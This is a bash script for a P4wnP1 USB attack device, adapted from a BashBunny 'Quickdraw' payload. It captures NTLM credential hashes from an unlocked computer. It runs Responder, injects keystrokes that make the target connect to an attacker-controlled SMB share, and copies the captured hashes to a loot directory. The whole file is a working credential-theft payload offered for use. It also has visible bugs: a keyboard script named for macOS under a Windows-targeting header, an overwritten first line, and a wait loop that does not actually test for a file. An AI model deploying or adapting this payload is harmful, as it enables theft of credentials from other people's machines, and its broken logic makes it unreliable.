#!/bin/bash

# Steal hashes from unlocked Windows machines
# Based on golem445 BashBunny Quickdraw: https://github.com/hak5/bashbunny-payloads/tree/master/payloads/library/credentials/Quickdraw
# You need to have responder installed: "apt-get install responder"
# You need to setup P4wnP1 USB Gadget Settings as RNDIS_ETHERNET and HID Keyboard.
# Copy this script to "/usr/local/P4wnP1/scripts/"
# Create a trigger that starts the bash script "Quickdraw.sh" when DHCP lease issued

RESPONDER_OPTIONS=" -w -F -P -v --upstream-proxy=UPSTREAM_PROXY --lm"
LOOTDIR=/usr/local/P4wnP1/www/loot/quickdraw
TARGET_HOSTNAME=$(cat /tmp/dnsmasq_usbeth.leases | cut -d " " -f4);
TARGET_IP=$(cat /tmp/dnsmasq_usbeth.leases | cut -d " " -f3);
HOST_IP=$(ifconfig usbeth | awk '$1=="inet"{print $2}');

echo "[*] Checking if responder installed..."
if [ ! -f /usr/sbin/responder ]; then
    echo "[!] Responder not found!"
    exit 1
  fi

echo "[*] Killing Responder..."
process=$(ps aux | grep 'Responder' | grep -v 'grep')

# Check if the process was found
if [ ! -z "$process" ]; then
    # Extract the PID
    pid=$(echo $process | awk '{print $2}')

    # Kill the process
    kill $pid

    echo "Process 'Responder' with PID $pid has been terminated."
else
    echo "No 'Responder' process found."
fi

echo "[*] Clearing responder logs directory..."
rm -f /usr/share/responder/logs/* 2>/dev/null
rm -f /usr/local/P4wnP1/HIDScripts/Quickdraw_osx.js 2>/dev/null

echo "[*] Creating loot dir..."
mkdir -p $LOOTDIR
HOST=$TARGET_HOSTNAME
[[ -z "$HOST" ]] && HOST="noname"
COUNT=$(ls -lad $LOOTDIR/$HOST* | wc -l)
COUNT=$((COUNT+1))
mkdir -p $LOOTDIR/$HOST-$COUNT
mkdir -p /usr/local/P4wnP1/www/loot/quickdraw/$HOST-$COUNT

if [ -z "$TARGET_IP" ]; then
	exit 1
fi

echo "[*] Starting responder..."
responder -I usbeth &
#responder -I usbeth $RESPONDER_OPTIONS &

sleep 5

# Create P4wnP1 HID script

echo "layout('us')" > /usr/local/P4wnP1/HIDScripts/Quickdraw_osx.js
echo "typingSpeed(100,150)" > /usr/local/P4wnP1/HIDScripts/Quickdraw_osx.js
echo "delay(5000)" >> /usr/local/P4wnP1/HIDScripts/Quickdraw_osx.js
echo "press(\"GUI k\")" >> /usr/local/P4wnP1/HIDScripts/Quickdraw_osx.js
echo "delay(500)" >> /usr/local/P4wnP1/HIDScripts/Quickdraw_osx.js
echo "type(\"smb://172.16.0.1/s\")" >> /usr/local/P4wnP1/HIDScripts/Quickdraw_osx.js
echo "delay(1000)" >> /usr/local/P4wnP1/HIDScripts/Quickdraw_osx.js
echo "press(\"ENTER\")" >> /usr/local/P4wnP1/HIDScripts/Quickdraw_osx.js
echo "delay(1000)" >> /usr/local/P4wnP1/HIDScripts/Quickdraw_osx.js
echo "press(\"ENTER\")" >> /usr/local/P4wnP1/HIDScripts/Quickdraw_osx.js
echo "delay(5000)" >> /usr/local/P4wnP1/HIDScripts/Quickdraw_osx.js
echo "press(\"ESC\")" >> /usr/local/P4wnP1/HIDScripts/Quickdraw_osx.js
echo "delay(1000)" >> /usr/local/P4wnP1/HIDScripts/Quickdraw_osx.js
echo "press(\"ESC\")" >> /usr/local/P4wnP1/HIDScripts/Quickdraw_osx.js

# Execute P4wnP1 HID script

P4wnP1_cli hid run -n Quickdraw_osx.js >/dev/null

sleep 10

while ! [ "-f /usr/share/responder/logs/*NTLM*" ];
do
    echo "[*] Waiting for hashes..."
    sleep 1
done

echo "[+] Hashes captured!"
echo "[*] Copying responder data to loot directory..."
cp /usr/share/responder/logs/* /usr/local/P4wnP1/www/loot/quickdraw/$HOST-$COUNT
cp /usr/share/responder/logs/* $LOOTDIR/$HOST-$COUNT
echo "[*] Clearing responder logs directory..."
rm -f /usr/share/responder/logs/* 2>/dev/null
echo "[*] Killing Responder..."

echo "[*] Checking if responder installed..."
if [ ! -f /usr/sbin/responder ]; then
    echo "[!] Responder not found!"
    exit 1
  fi

echo "[*] Killing Responder..."
process=$(ps aux | grep 'Responder' | grep -v 'grep')

# Check if the process was found
if [ ! -z "$process" ]; then
    # Extract the PID
    pid=$(echo $process | awk '{print $2}')

    # Kill the process
    kill $pid

    echo "Process 'Responder' with PID $pid has been terminated."
else
    echo "No 'Responder' process found."
fi

rm -f /usr/local/P4wnP1/HIDScripts/Quickdraw_osx.js 2>/dev/null
P4wnP1_cli hid run -c 'press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);' >/dev/null